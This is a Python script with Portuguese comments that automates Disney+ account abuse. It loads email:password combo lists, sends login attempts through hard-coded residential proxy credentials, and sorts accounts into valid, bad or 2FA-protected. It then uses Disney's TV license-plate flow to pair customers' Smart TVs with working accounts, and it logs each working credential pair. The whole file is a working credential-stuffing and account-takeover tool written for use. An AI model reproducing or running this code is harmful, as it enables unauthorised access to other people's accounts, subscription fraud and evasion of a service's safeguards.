import os
import re
import sys
import json
import uuid
import time
import glob
import random
import threading
from datetime import datetime
from typing import Dict, Optional, Tuple, List, Set

import requests

try:
    import kernel_logger
except ImportError:
    kernel_logger = None

def push_disney_log(msg: str, level: str = "info"):
    if kernel_logger:
        try:
            kernel_logger.push_kernel_log(msg, level=level)
        except Exception:
            pass
    print(f"[*] [Disney+] {msg}", flush=True)

# ==============================================================================
#  CONFIGURAÇÕES & PROXY RESIDENCIAL (DataImpulse)
# ==============================================================================
PROXY_USER = os.environ.get("PROXY_USER", "d0282d505e94efb35346").strip()
PROXY_PASS = os.environ.get("PROXY_PASS", "45922528a7251544").strip()
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com").strip()
PROXY_PORT = os.environ.get("PROXY_PORT", "823").strip()

PROXIES = {
    "http":  f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
    "https": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
}

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DISNEY_DIR  = os.path.join(BASE_DIR, "disney")
COMBO_DIR   = os.path.join(BASE_DIR, "combo")
RESULTS_DIR = os.path.join(BASE_DIR, "results")
HITS_DIR    = os.path.join(BASE_DIR, "hits")
FILE_ACTIVATED = os.path.join(RESULTS_DIR, "tv_ativadas.txt")

os.makedirs(DISNEY_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(HITS_DIR, exist_ok=True)

GRAPH_GQL_URL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
PUBLIC_GQL    = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
TOKEN_URL     = "https://disney.api.edge.bamgrid.com/token"

SDK_CLIENT_ID = "disney-svod-3d9324fc"
SDK_VERSION   = "35.6"
SDK_PLATFORM  = "javascript/windows/chrome"
USER_AGENT    = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
FALLBACK_APIKEY = (
    "ZGlzbmV5JmJyb3dzZXImMS4wLjA"
    ".Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
)

EMOJI_FLAGS = {
    "US":"🇺🇸","BR":"🇧🇷","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺",
    "DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","MX":"🇲🇽",
    "AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","PT":"🇵🇹","NL":"🇳🇱",
    "JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","SE":"🇸🇪","NO":"🇳🇴",
    "DK":"🇩🇰","FI":"🇫🇮","BE":"🇧🇪","CH":"🇨🇭","AT":"🇦🇹",
    "PL":"🇵🇱","NZ":"🇳🇿","SG":"🇸🇬","ZA":"🇿🇦","IE":"🇮🇪",
    "HK":"🇭🇰","TR":"🇹🇷","RU":"🇷🇺","PE":"🇵🇪","VE":"🇻🇪",
}

def get_flag(code):
    if not code or code == "N/A":
        return "🌐"
    return EMOJI_FLAGS.get(str(code).upper(), f"[{str(code).upper()}]")

EMAIL_PASS_PATTERN = re.compile(
    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[:|;]\s*(\S+)'
)

REGISTER_DEVICE_MUTATION = (
    "mutation registerDevice($input:RegisterDeviceInput!)"
    "{registerDevice(registerDevice:$input){grant{grantType assertion}}}"
)

LOGIN_MUTATION = """
mutation login($input: LoginInput!) {
    login(login: $input) {
        actionGrant
        account {
            id
            activeProfile { id }
        }
        activeSession { isSubscriber }
    }
}
"""

SUBSCRIPTION_QUERY = """
query {
    me {
        account {
            id
            attributes {
                email emailVerified
                locations {
                    purchase { country source }
                    registration { geoIp { country } }
                }
            }
        }
        entitlements { tier isExtraMember }
        identity {
            id
            subscriber {
                subscriberStatus subscriptionAtRisk
                subscriptions {
                    id state partner isEntitled paymentProvider
                    product { id name bundle subscriptionPeriod }
                    term {
                        purchaseDate startDate expiryDate
                        nextRenewalDate isFreeTrial
                    }
                }
            }
        }
    }
}
"""

EXCHANGE_LICENSE_PLATE_MUTATION = """
mutation exchangeLicensePlateForOffDeviceGrant($input: ExchangeLicensePlateForOffDeviceGrantInput!) {
  exchangeLicensePlateForOffDeviceGrant(exchangeLicensePlateForOffDeviceGrant: $input) {
    offDeviceGrant
    additionalClaims {
      name
      value
    }
  }
}
"""

REDEEM_OFF_DEVICE_GRANT_MUTATION = """
mutation redeemOffDeviceGrant($input: RedeemOffDeviceGrantInput!) {
  redeemOffDeviceGrant(redeemOffDeviceGrant: $input) {
    accepted
  }
}
"""

# ==============================================================================
#  LOCKS E ESTADO EM MEMÓRIA
# ==============================================================================
_disney_lock = threading.Lock()
_apikey_cache = None
_apikey_lock  = threading.Lock()
DEAD_DISNEY_ACCOUNTS: Set[str] = set()
DEAD_DISNEY_TIMESTAMPS: Dict[str, float] = {}
DEAD_FAIL_COOLDOWN = 600  # 10 minutos de cooldown temporário se falhar senha

def is_account_dead(email: str) -> bool:
    em = str(email or "").strip().lower()
    if em in DEAD_DISNEY_ACCOUNTS:
        fail_ts = DEAD_DISNEY_TIMESTAMPS.get(em, 0.0)
        if time.time() - fail_ts > DEAD_FAIL_COOLDOWN:
            DEAD_DISNEY_ACCOUNTS.discard(em)
            DEAD_DISNEY_TIMESTAMPS.pop(em, None)
            return False
        return True
    return False

def mark_account_dead(email: str):
    em = str(email or "").strip().lower()
    if em:
        DEAD_DISNEY_ACCOUNTS.add(em)
        DEAD_DISNEY_TIMESTAMPS[em] = time.time()

def clear_dead_accounts():
    DEAD_DISNEY_ACCOUNTS.clear()
    DEAD_DISNEY_TIMESTAMPS.clear()
USED_DISNEY_ACCOUNTS: Set[str] = set()
DISNEY_LAST_USED_AT: Dict[str, float] = {}

def _headers(auth_token, form=False, account_id=None):
    h = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded" if form else "application/json",
        "x-bamsdk-client-id": SDK_CLIENT_ID,
        "x-bamsdk-version": SDK_VERSION,
        "x-bamsdk-platform": SDK_PLATFORM,
        "x-bamsdk-platform-id": "browser",
        "x-disney-identity-client-id": "DTCI-DISNEYPLUS.WEB",
        "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
        "user-agent": USER_AGENT,
        "origin": "https://www.disneyplus.com",
        "referer": "https://www.disneyplus.com/",
        "accept-language": "pt-BR,pt;q=0.7",
        "dnt": "1",
        "authorization": f"Bearer {auth_token}",
        "x-request-id": str(uuid.uuid4()),
    }
    if account_id:
        h["x-bamtech-account-id"] = str(account_id)
    return h

def _post(url, **kwargs):
    kwargs.setdefault("timeout", 25)
    if "proxies" not in kwargs and PROXY_HOST:
        kwargs["proxies"] = PROXIES
    try:
        return requests.post(url, **kwargs)
    except Exception:
        # Se falhou com proxy, tenta fallback direto
        if "proxies" in kwargs:
            kwargs_direct = kwargs.copy()
            kwargs_direct.pop("proxies", None)
            kwargs_direct["timeout"] = 15
            try:
                return requests.post(url, **kwargs_direct)
            except Exception:
                pass
        raise

def _get(url, **kwargs):
    kwargs.setdefault("timeout", 15)
    if "proxies" not in kwargs and PROXY_HOST:
        kwargs["proxies"] = PROXIES
    try:
        return requests.get(url, **kwargs)
    except Exception:
        if "proxies" in kwargs:
            kwargs_direct = kwargs.copy()
            kwargs_direct.pop("proxies", None)
            kwargs_direct["timeout"] = 10
            try:
                return requests.get(url, **kwargs_direct)
            except Exception:
                pass
        raise

def get_client_apikey() -> str:
    global _apikey_cache
    with _apikey_lock:
        if _apikey_cache:
            return _apikey_cache
        sdk_url = (
            f"https://client-sdk-configs.bamgrid.com/"
            f"bam-sdk/v7.0/{SDK_CLIENT_ID}/browser/"
            f"v{SDK_VERSION}/windows/chrome/prod.json"
        )
        try:
            r = _get(sdk_url, headers={"user-agent": USER_AGENT, "accept": "application/json"})
            if r.status_code == 200:
                cfg = r.json()
                key = (
                    cfg.get("clientApiKey") or cfg.get("client_api_key") or
                    cfg.get("apiKey") or
                    cfg.get("bam", {}).get("clientApiKey") or
                    cfg.get("auth", {}).get("clientApiKey")
                )
                if key:
                    _apikey_cache = key
                    return key
        except Exception:
            pass
        try:
            r = _get("https://www.disneyplus.com",
                     headers={"user-agent": USER_AGENT, "accept-language": "pt-BR,pt;q=0.7"})
            if r.status_code == 200:
                matches = re.findall(
                    r'["\']?(ZGlzbmV5[A-Za-z0-9+/=]{20,}\.[A-Za-z0-9_\-]{20,})["\']?',
                    r.text)
                for m in matches:
                    if len(m) < 200:
                        _apikey_cache = m
                        return m
        except Exception:
            pass
        _apikey_cache = FALLBACK_APIKEY
        return FALLBACK_APIKEY

def register_device(apikey: str) -> Optional[str]:
    payload = {
        "query": REGISTER_DEVICE_MUTATION,
        "variables": {"input": {
            "deviceFamily": "browser",
            "applicationRuntime": "chrome",
            "deviceProfile": "windows",
            "deviceLanguage": "pt-BR",
            "attributes": {
                "osDeviceIds": [],
                "manufacturer": "microsoft",
                "model": None,
                "operatingSystem": "windows",
                "operatingSystemVersion": "10.0",
                "browserName": "chrome",
                "browserVersion": "124.0.0",
                "brand": "web",
            },
        }},
        "operationName": "registerDevice",
    }
    for attempt in range(3):
        try:
            r = _post(f"{GRAPH_GQL_URL}?op=registerDevice", headers=_headers(apikey), json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                if "errors" not in res:
                    assertion = (res.get("data", {}).get("registerDevice", {})
                                   .get("grant", {}).get("assertion"))
                    if assertion:
                        return assertion
        except Exception:
            pass
        if attempt < 2:
            time.sleep(1)
    return None

def get_anon_token(assertion: str, apikey: str) -> Tuple[Optional[str], Optional[str]]:
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }
    for attempt in range(3):
        try:
            r = _post(TOKEN_URL, headers=_headers(apikey, form=True), data=data, timeout=20)
            if r.status_code in (200, 201):
                j = r.json()
                token = j.get("access_token")
                refresh = j.get("refresh_token")
                if token:
                    return token, refresh
        except Exception:
            pass
        if attempt < 2:
            time.sleep(1)
    return None, None

_BAD_CODES = {
    "BAD_REQUEST", "INVALID_CREDENTIALS", "INVALID_PASSWORD",
    "INVALID_EMAIL", "ACCOUNT_NOT_FOUND", "USER_NOT_FOUND",
    "FORBIDDEN", "AUTHENTICATION_FAILED", "INCORRECT_PASSWORD",
    "NOTFOUND", "NOT_FOUND", "UNAUTHORIZED_ACCESS",
    "BAD_CREDENTIALS", "WRONG_PASSWORD",
    "ERROR_AUTHORIZATION_INVALID_CREDENTIALS",
    "ERROR_AUTHORIZATION_ACCOUNT_NOT_FOUND",
    "ERROR_AUTHORIZATION_INVALID_PASSWORD",
    "CREDENTIALS_INVALID", "PASSWORD_INVALID", "EMAIL_INVALID",
}
_BAD_MSGS = [
    "invalid", "incorrect", "wrong password", "no account",
    "not found", "bad credentials", "authentication failed",
    "does not exist", "email or password",
]
_2FA_CODES = {
    "STEP_UP", "MFA", "TWO_FACTOR", "2FA", "OTP",
    "VERIFICATION_REQUIRED", "MULTIFACTOR",
}
_2FA_MSGS = [
    "step-up", "two-factor", "verification required",
    "mfa", "otp", "multi-factor",
]

def _exchange_action_grant(action_grant: str, anon_token: str) -> Optional[str]:
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": action_grant,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:authorization_code",
    }
    try:
        r = _post(TOKEN_URL, headers=_headers(anon_token, form=True), data=data, timeout=20)
        if r.status_code in (200, 201):
            return r.json().get("access_token")
    except Exception:
        pass
    return None

def do_login(email: str, password: str, anon_token: str):
    """
    Retorna (status, auth_token, is_subscriber, action_grant, account_id, user_refresh_token)
    """
    payload = {
        "query": LOGIN_MUTATION,
        "variables": {"input": {"email": email, "password": password}},
        "operationName": "login",
    }
    for attempt in range(3):
        try:
            r = _post(f"{PUBLIC_GQL}?op=login", headers=_headers(anon_token), json=payload, timeout=20)
            if r.status_code == 429:
                return ("RETRY_TOKEN", None, False, None, None, None)
            if r.status_code in (401, 403):
                return ("RETRY_TOKEN", None, False, None, None, None)
            res = r.json()
            break
        except Exception:
            if attempt < 2:
                time.sleep(1)
                continue
            return ("ERR", None, False, None, None, None)
    else:
        return ("ERR", None, False, None, None, None)

    if "errors" in res:
        is_bad = False
        for err in res["errors"]:
            raw_code = (
                err.get("extensions", {}).get("code") or
                err.get("code", "") or
                err.get("extensions", {}).get("errorCode", "") or
                ""
            )
            code = str(raw_code).upper().replace("-", "_").replace(" ", "_").replace(".", "_")
            msg  = (err.get("message") or err.get("description", "") or "").lower()

            if any(k in code for k in _2FA_CODES) or any(k in msg for k in _2FA_MSGS):
                return ("2FA", None, False, None, None, None)

            if any(k in code for k in _BAD_CODES) or any(k in msg for k in _BAD_MSGS):
                is_bad = True

        return ("BAD", None, False, None, None, None) if is_bad else ("ERR", None, False, None, None, None)

    login_data = res.get("data", {}).get("login", {}) or {}
    is_sub_flag = bool(login_data.get("activeSession", {}).get("isSubscriber", False))
    action_grant = login_data.get("actionGrant")
    account_id = login_data.get("account", {}).get("id")

    sdk = res.get("extensions", {}).get("sdk", {}).get("token") or {}
    auth_token = None
    user_refresh_token = None
    if isinstance(sdk, dict) and sdk.get("accessToken"):
        auth_token = sdk["accessToken"]
        user_refresh_token = sdk.get("refreshToken")
    else:
        if action_grant:
            auth_token = _exchange_action_grant(action_grant, anon_token)

    return ("OK", auth_token, is_sub_flag, action_grant, account_id, user_refresh_token)

def check_subscription(auth_token: str) -> Optional[dict]:
    """Busca dados de assinatura nos servidores oficiais Disney+."""
    for attempt in range(3):
        try:
            r = _post(PUBLIC_GQL, headers=_headers(auth_token),
                      json={"query": SUBSCRIPTION_QUERY, "variables": {}}, timeout=20)
            if r.status_code == 401:
                return None
            if r.status_code != 200:
                if attempt < 2:
                    time.sleep(1)
                    continue
                return None
            me = r.json().get("data", {}).get("me")
            if not me:
                if attempt < 2:
                    time.sleep(1)
                    continue
                return None
            account      = me.get("account", {})
            identity     = me.get("identity", {})
            entitlements = me.get("entitlements", {})
            subscriber   = identity.get("subscriber", {})
            attrs        = account.get("attributes", {})
            locations    = attrs.get("locations", {})
            subs         = subscriber.get("subscriptions", [])
            pc = locations.get("purchase", {}).get("country", "N/A")
            rc = locations.get("registration", {}).get("geoIp", {}).get("country", "N/A")
            country = pc if pc and pc != "N/A" else rc
            return {
                "account_id":       account.get("id"),
                "email":            attrs.get("email", "N/A"),
                "emailVerified":    attrs.get("emailVerified", False),
                "country":          country,
                "subscriberStatus": subscriber.get("subscriberStatus", "N/A"),
                "tier":             entitlements.get("tier", "N/A"),
                "subscriptions":    subs,
            }
        except Exception:
            if attempt < 2:
                time.sleep(1)
                continue
            return None
    return None

def _build_plan(data: dict) -> Tuple[str, str, str]:
    if not data:
        return "Disney+ VIP", "BR", "🇧🇷"
    subs    = data.get("subscriptions", [])
    country = data.get("country", "BR") or "BR"
    flag    = get_flag(country)
    plan    = "Disney+ Standard"
    for sub in subs:
        name     = sub.get("product", {}).get("name", "")
        partner  = sub.get("partner")  or ""
        provider = sub.get("paymentProvider") or ""
        if name:
            parts = [name]
            if country and country != "N/A":
                parts.append(country)
            if str(partner) not in ("None", "", "null"):
                parts.append(str(partner))
            if str(provider) not in ("None", "", "null"):
                parts.append(str(provider))
            plan = " - ".join(parts)
            break
    return plan, country, flag

def exchange_tv_code(license_plate: str, anon_token: str) -> Tuple[bool, str]:
    """
    1º Passo: Valida e troca o código de 8 dígitos da TV (licensePlate)
    pelo grant do dispositivo (offDeviceGrant).
    """
    payload = {
        "query": EXCHANGE_LICENSE_PLATE_MUTATION,
        "variables": {"input": {"licensePlate": str(license_plate).strip().upper()}},
        "operationName": "exchangeLicensePlateForOffDeviceGrant",
    }
    endpoint = f"{PUBLIC_GQL}?op=exchangeLicensePlateForOffDeviceGrant"
    for attempt in range(2):
        try:
            r = _post(endpoint, headers=_headers(anon_token), json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                errs = res.get("errors", [])
                if errs:
                    msgs = "; ".join(e.get("message", "?") for e in errs)
                    return False, msgs
                grant = (
                    res.get("data", {})
                       .get("exchangeLicensePlateForOffDeviceGrant") or {}
                )
                off_device_grant = grant.get("offDeviceGrant") if isinstance(grant, dict) else None
                if off_device_grant:
                    return True, off_device_grant
                return False, f"offDeviceGrant vazio: {grant}"
            elif r.status_code in (401, 403):
                return False, f"HTTP {r.status_code} token expirado"
            else:
                return False, f"HTTP {r.status_code}"
        except Exception as e:
            if attempt < 1:
                time.sleep(1)
            else:
                return False, f"Erro de rede: {e}"
    return False, "Sem resposta dos servidores Disney+"

def redeem_tv_grant(action_grant: str, off_device_grant: str, auth_token: str, account_id: str, refresh_token: str) -> Tuple[bool, str]:
    """
    2º Passo: Vincula a conta logada ao dispositivo da TV.
    Efetiva a ativação instantânea na TV!
    """
    payload = {
        "query": REDEEM_OFF_DEVICE_GRANT_MUTATION,
        "variables": {
            "input": {
                "actionGrant": action_grant,
                "offDeviceGrant": off_device_grant,
                "offDeviceRedemptionFlow": "Login",
                "refreshToken": refresh_token,
            }
        },
        "operationName": "redeemOffDeviceGrant",
    }
    endpoint = f"{PUBLIC_GQL}?op=redeemOffDeviceGrant"
    hdrs = _headers(auth_token, account_id=account_id)
    for attempt in range(2):
        try:
            r = _post(endpoint, headers=hdrs, json=payload, timeout=20)
            if r.status_code in (200, 201):
                res = r.json()
                errs = res.get("errors", [])
                if errs:
                    msgs = "; ".join(e.get("message", "?") for e in errs)
                    return False, msgs
                accepted = (
                    res.get("data", {})
                       .get("redeemOffDeviceGrant", {})
                       .get("accepted")
                )
                if accepted:
                    return True, "OK"
                return False, f"accepted={accepted}"
            else:
                return False, f"HTTP {r.status_code}"
        except Exception as e:
            if attempt < 1:
                time.sleep(1)
            else:
                return False, f"Erro de rede: {e}"
    return False, "Sem resposta"

# ==============================================================================
#  GERENCIAMENTO DE CONTAS E COMBO
# ==============================================================================
def get_used_emails() -> Set[str]:
    """Lê emails de contas que já ativaram alguma TV."""
    used = set()
    if os.path.exists(FILE_ACTIVATED):
        try:
            with open(FILE_ACTIVATED, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    m = EMAIL_PASS_PATTERN.search(line)
                    if m:
                        used.add(m.group(1).strip().lower())
        except Exception:
            pass
    return used

def record_tv_activation(email: str, password: str, tv_code: str, plan: str, country: str):
    """Registra ativação bem-sucedida nos relatórios e histórico."""
    try:
        agora = datetime.now().strftime("%d/%m/%Y %H:%M")
        line = f"{email}:{password} | TV: {tv_code} | {plan} | {country} | Data: {agora}\n"
        with _disney_lock:
            with open(FILE_ACTIVATED, "a", encoding="utf-8") as f_ok:
                f_ok.write(line)
    except Exception:
        pass

def load_all_disney_accounts(force_reload: bool = False) -> List[dict]:
    """
    Carrega todas as contas cadastradas nas pastas disney/ e combo/,
    garantindo que o estoque reflita fielmente as contas disponíveis sem zerar.
    """
    used_emails = get_used_emails()

    files = (
        glob.glob(os.path.join(DISNEY_DIR, "*.txt")) +
        glob.glob(os.path.join(DISNEY_DIR, "*.csv")) +
        glob.glob(os.path.join(COMBO_DIR, "disney*.txt")) +
        glob.glob(os.path.join(COMBO_DIR, "disney*.csv")) +
        glob.glob(os.path.join(COMBO_DIR, "combo*.txt"))
    )

    seen_paths = set()
    unique_files = []
    for f in sorted(files, key=os.path.getmtime, reverse=True):
        norm = os.path.normcase(os.path.abspath(f))
        if norm not in seen_paths and not norm.endswith(".py") and "tv_ativadas" not in norm:
            seen_paths.add(norm)
            unique_files.append(f)

    seen_emails = set()
    accounts = []

    for f in unique_files:
        fname = os.path.basename(f)
        try:
            with open(f, "r", encoding="utf-8", errors="ignore") as fh:
                for l in fh:
                    m = EMAIL_PASS_PATTERN.search(l)
                    if m:
                        email = m.group(1).strip()
                        pwd   = m.group(2).strip()
                        em_low = email.lower()
                        if em_low not in seen_emails:
                            seen_emails.add(em_low)
                            accounts.append({
                                "file": fname,
                                "email": email,
                                "password": pwd,
                                "info": {
                                    "email": email,
                                    "plan": "Disney+ VIP",
                                    "country": "BR",
                                    "flag": "🇧🇷"
                                },
                                "validated": False
                            })
        except Exception:
            pass

    # Ordenação justa e resiliente:
    # 1. Contas saudáveis (fora do cooldown de erro)
    # 2. Contas nunca usadas vêm primeiro; depois, as usadas há mais tempo (Round-Robin)
    def sort_key(acc):
        em = acc["email"].lower()
        dead_score = 1000000000.0 if is_account_dead(em) else 0.0
        used_score = 100000.0 if (em in used_emails or em in USED_DISNEY_ACCOUNTS) else 0.0
        last_used = DISNEY_LAST_USED_AT.get(em, 0.0)
        return (dead_score, used_score, last_used)

    accounts.sort(key=sort_key)
    return accounts

def find_disney_valid_account() -> Optional[dict]:
    """Retorna a próxima conta Disney+ disponível da fila usando rotação justa."""
    accounts = load_all_disney_accounts()
    if not accounts:
        return None

    # Tenta primeira conta saudável (fora do cooldown de erro)
    healthy = [acc for acc in accounts if not is_account_dead(acc["email"])]
    if healthy:
        return healthy[0]

    # Se todas estiverem em cooldown (ex: instabilidade temporária), perdoa e usa a primeira
    clear_dead_accounts()
    return accounts[0]

def select_disney_account_by_identifier(identifier: str) -> Optional[dict]:
    """Localiza uma conta específica por email ou nome de arquivo."""
    accounts = load_all_disney_accounts()
    target = identifier.strip().lower()
    for acc in accounts:
        if acc["email"].lower() == target or acc["file"].lower() == target or target in acc["email"].lower():
            return acc
    return None

def add_disney_single_account(email: str, password: str) -> bool:
    """Adiciona uma conta Disney+ única ao arquivo disney/combo.txt."""
    fpath = os.path.join(DISNEY_DIR, "combo.txt")
    try:
        with open(fpath, "a", encoding="utf-8") as f:
            f.write(f"{email.strip()}:{password.strip()}\n")
        return True
    except Exception:
        return False

def add_disney_combos(raw_text: str) -> Tuple[int, str]:
    """Importa lista de combos email:senha para disney/combo.txt."""
    lines = raw_text.splitlines()
    valid_lines = []
    for l in lines:
        m = EMAIL_PASS_PATTERN.search(l)
        if m:
            valid_lines.append(f"{m.group(1).strip()}:{m.group(2).strip()}")

    if not valid_lines:
        return 0, "Nenhuma conta no formato email:senha encontrada."

    fpath = os.path.join(DISNEY_DIR, "combo.txt")
    try:
        with open(fpath, "a", encoding="utf-8") as f:
            for vl in valid_lines:
                f.write(vl + "\n")
        return len(valid_lines), f"{len(valid_lines)} contas Disney+ importadas com sucesso!"
    except Exception as e:
        return 0, f"Erro ao salvar arquivo: {e}"

def delete_disney_account(identifier: str) -> bool:
    """Remove uma conta específica de todos os arquivos em disney/."""
    target = identifier.strip().lower()
    files = glob.glob(os.path.join(DISNEY_DIR, "*.txt")) + glob.glob(os.path.join(DISNEY_DIR, "*.csv"))
    removed = False
    for fpath in files:
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            new_lines = []
            for l in lines:
                m = EMAIL_PASS_PATTERN.search(l)
                if m and (m.group(1).strip().lower() == target or target in m.group(1).strip().lower()):
                    removed = True
                    continue
                new_lines.append(l)
            if removed:
                with open(fpath, "w", encoding="utf-8") as f:
                    f.writelines(new_lines)
        except Exception:
            pass
    return removed

# ==============================================================================
#  ATIVAÇÃO COMPLETA NA SMART TV
# ==============================================================================
def activate_disney_tv(clean_code: str, account_data: Optional[dict] = None) -> Tuple[bool, str, Optional[dict]]:
    """
    Executa a ativação oficial na Smart TV para Disney+:
    1. Valida e troca o código da TV (8 dígitos) por offDeviceGrant
    2. Autentica a conta Disney+ (ou pega da fila)
    3. Vincula a TV e confirma a liberação da tela
    """
    plate = clean_code.strip().replace("-", "").replace(" ", "").upper()
    if len(plate) < 6:
        return False, "O código exibido na Smart TV deve ter 8 caracteres.", None

    push_disney_log(f"🏰 Iniciando conexão para ativação na TV com código {plate}...")

    # 1. Obtém API Key e sessão anônima da Disney
    apikey = get_client_apikey()
    assertion = register_device(apikey)
    if not assertion:
        return False, "Não foi possível registrar dispositivo no portal Disney+. Tente novamente.", None

    anon_token, anon_refresh = get_anon_token(assertion, apikey)
    if not anon_token:
        return False, "Falha ao obter token da sessão Disney+. Verifique a rede ou proxy.", None

    # 2. Valida o código da TV na Disney UMA VEZ
    ok_ex, res_ex = exchange_tv_code(plate, anon_token)
    if not ok_ex:
        push_disney_log(f"❌ Código de TV inválido ou expirado: {res_ex}", level="warn")
        return False, f"Código de TV Disney+ inválido ou expirado ({res_ex}). Abra novamente o aplicativo na sua TV para obter um novo código.", None

    off_device_grant = res_ex
    push_disney_log(f"✔ Código {plate} validado e reconhecido pelos servidores Disney+!", level="success")

    # 3. Lista de contas candidatas (a especificada primeiro, depois o pool)
    candidates: List[dict] = []
    if account_data and account_data.get("email"):
        candidates.append(account_data)

    all_accounts = load_all_disney_accounts()
    for acc in all_accounts:
        if not any(c["email"].lower() == acc["email"].lower() for c in candidates):
            candidates.append(acc)

    if not candidates:
        return False, "Nenhuma conta Disney+ disponível no estoque. Adicione contas no painel de administração.", None

    current_anon_token = anon_token
    current_anon_refresh = anon_refresh

    # 4. Percorre as contas até ativar com sucesso
    for idx, candidate in enumerate(candidates[:15], 1):
        email = candidate["email"].strip()
        password = candidate["password"].strip()
        em_low = email.lower()

        push_disney_log(f"🔑 [{idx}/{len(candidates)}] Testando login da conta: {email}...")

        status, auth_token, is_sub_flag, action_grant, account_id, user_refresh = do_login(
            email, password, current_anon_token
        )

        if status == "RETRY_TOKEN":
            # Renova sessão anônima
            ass = register_device(apikey)
            new_anon, new_ref = get_anon_token(ass, apikey) if ass else (None, None)
            if new_anon:
                current_anon_token, current_anon_refresh = new_anon, new_ref
                status, auth_token, is_sub_flag, action_grant, account_id, user_refresh = do_login(
                    email, password, current_anon_token
                )

        if status in ("BAD", "2FA") or status != "OK" or not auth_token:
            push_disney_log(f"⚠️ Conta {email} falhou no login ({status}). Tentando próxima...", level="warn")
            if status in ("BAD", "2FA"):
                mark_account_dead(em_low)
            continue

        # Checa plano / assinatura
        sub_data = check_subscription(auth_token)
        plan, country, flag = _build_plan(sub_data)
        if "hulu with ads" in plan.lower() and "disney" not in plan.lower():
            push_disney_log(f"⚠️ Conta {email} possui plano sem Disney+: {plan}. Pulando...", level="warn")
            continue

        acc_id = account_id or (sub_data.get("account_id") if sub_data else None)
        ref_tok = user_refresh or current_anon_refresh

        if not action_grant:
            push_disney_log(f"⚠️ Conta {email} sem action_grant. Pulando...", level="warn")
            continue

        # Vincula a Smart TV!
        push_disney_log(f"📺 Vinculando TV {plate} com {email} ({plan})...")
        ok_tv, motivo = redeem_tv_grant(action_grant, off_device_grant, auth_token, acc_id, ref_tok)

        if ok_tv:
            # SUCESSO!
            push_disney_log(f"🎉 [SUCESSO] TV {plate} ativada com sucesso na conta {email}!", level="success")
            record_tv_activation(email, password, plate, plan, country)
            USED_DISNEY_ACCOUNTS.add(em_low)
            DISNEY_LAST_USED_AT[em_low] = time.time()

            account_info = {
                "email": email,
                "plan": plan,
                "country": country,
                "flag": flag,
                "tv_code": plate,
                "activated_at": datetime.now().strftime("%d/%m/%Y %H:%M")
            }
            return True, "Sua Smart TV foi pareada e ativada com sucesso no Disney+! Já pode assistir!", account_info
        else:
            push_disney_log(f"⚠️ Falha no vínculo com a TV ({motivo}).", level="warn")

    return False, "Não foi possível parear a TV com as contas Disney+ disponíveis. Verifique o código digitado ou adicione novas contas.", None
